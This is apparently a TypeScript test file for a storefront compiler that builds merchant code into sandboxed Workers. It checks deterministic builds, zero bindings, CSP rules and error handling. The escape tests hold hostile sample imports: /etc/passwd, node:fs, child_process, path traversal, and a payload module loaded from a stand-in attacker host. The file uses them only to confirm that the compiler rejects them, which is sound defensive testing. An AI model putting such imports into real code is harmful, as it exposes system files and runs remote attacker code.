import { Miniflare, Response as MiniflareResponse } from 'miniflare';
import { describe, expect, it } from 'vitest';
import { createOgabasseyStorefrontManifest } from '../benchmark/ogabassey-catalog-fixture';
import {
  compileStorefrontWorker,
  StorefrontCompilerError,
} from './compile-storefront';

describe('compileStorefrontWorker capability & closed-graph enforcement', () => {
  it('compiles deterministically without executing merchant module code and enforces zero bindings', async () => {
    const manifest = createOgabasseyStorefrontManifest();
    manifest.files[manifest.files.length - 1] = {
      path: 'src/StorefrontApp.tsx',
      content: `
        if (typeof globalThis !== 'undefined' && globalThis.__COMPILER_HOST__) {
          throw new Error('MUST_NOT_EXECUTE_AT_COMPILE_TIME');
        }
        export default function SafeApp() {
          return <main className="p-6"><h1 className="text-2xl font-bold">Deterministic Store</h1></main>;
        }
      `,
    };

    (globalThis as Record<string, unknown>).__COMPILER_HOST__ = true;
    try {
      const first = await compileStorefrontWorker(manifest);
      const second = await compileStorefrontWorker(manifest);

      expect(first.buildDigest).toBe(second.buildDigest);
      expect(first.sourceDigest).toBe(second.sourceDigest);
      expect(first.bindings).toEqual([]);
      expect(first.metrics.clientGzipBytes).toBeLessThanOrEqual(150 * 1024);
      expect(first.metrics.cssGzipBytes).toBeLessThanOrEqual(50 * 1024);
      expect(first.cssCode).toContain('.p-6');
      expect(first.cspGovernance.vettedOrigins).toContain(
        'https://www.googletagmanager.com'
      );
      expect(first.cspGovernance.unvettedOrigins).toEqual([]);
    } finally {
      delete (globalThis as Record<string, unknown>).__COMPILER_HOST__;
    }
  });

  it.each([
    [
      'node:fs builtin',
      'import fs from "node:fs"; export default function X(){return <p>{String(fs)}</p>;}',
    ],
    [
      'bare child_process builtin',
      'import cp from "child_process"; export default function X(){return <p>{String(cp)}</p>;}',
    ],
    [
      'cloudflare:sockets builtin',
      'import { connect } from "cloudflare:sockets"; export default function X(){return <p>{String(connect)}</p>;}',
    ],
    [
      'absolute host path /etc/passwd',
      'import secret from "/etc/passwd"; export default function X(){return <p>{String(secret)}</p>;}',
    ],
    [
      'parent path traversal ../',
      'import leak from "../../package.json"; export default function X(){return <p>{String(leak)}</p>;}',
    ],
    [
      'external HTTPS module',
      'import mod from "https://evil.example/payload.js"; export default function X(){return <p>{String(mod)}</p>;}',
    ],
    [
      'undeclared npm package',
      'import { z } from "zod"; export default function X(){return <p>{String(z)}</p>;}',
    ],
    [
      'banned react-dom/server subpath',
      'import { renderToString } from "react-dom/server"; export default function X(){return <p>{String(renderToString)}</p>;}',
    ],
  ])('fails closed on graph escape: %s', async (_label, escapeCode) => {
    const manifest = createOgabasseyStorefrontManifest();
    manifest.files = [{ path: 'src/StorefrontApp.tsx', content: escapeCode }];

    await expect(compileStorefrontWorker(manifest)).rejects.toBeInstanceOf(
      StorefrontCompilerError
    );
  });

  it('contains runtime SSR exceptions inside the zero-binding Worker error boundary with 500 fallback and frame-error script', async () => {
    const manifest = createOgabasseyStorefrontManifest();
    manifest.files = [
      {
        path: 'src/StorefrontApp.tsx',
        content: `
          export default function CrashingApp() {
            throw new Error('merchant render boom');
          }
        `,
      },
    ];
    const compiled = await compileStorefrontWorker(manifest);
    const mf = new Miniflare({
      modules: [
        { type: 'ESModule', path: 'worker.mjs', contents: compiled.workerCode },
      ],
      compatibilityDate: '2026-07-01',
      bindings: {},
      outboundService: () =>
        new MiniflareResponse(
          JSON.stringify({
            title: 'Home',
            products: [],
            facets: { brands: [], conditions: [], totalMatches: 0 },
          }),
          { status: 200, headers: { 'content-type': 'application/json' } }
        ),
    });
    try {
      const res = await mf.dispatchFetch('https://ogabassey.mybaci.store/');
      expect(res.status).toBe(500);
      expect(res.headers.get('content-security-policy')).toContain(
        "form-action 'none'"
      );
      const html = await res.text();
      expect(html).toContain('Storefront Render Error');
      expect(html).toContain('/_baci/assets/frame-error.');
    } finally {
      await mf.dispose();
    }
  });
});
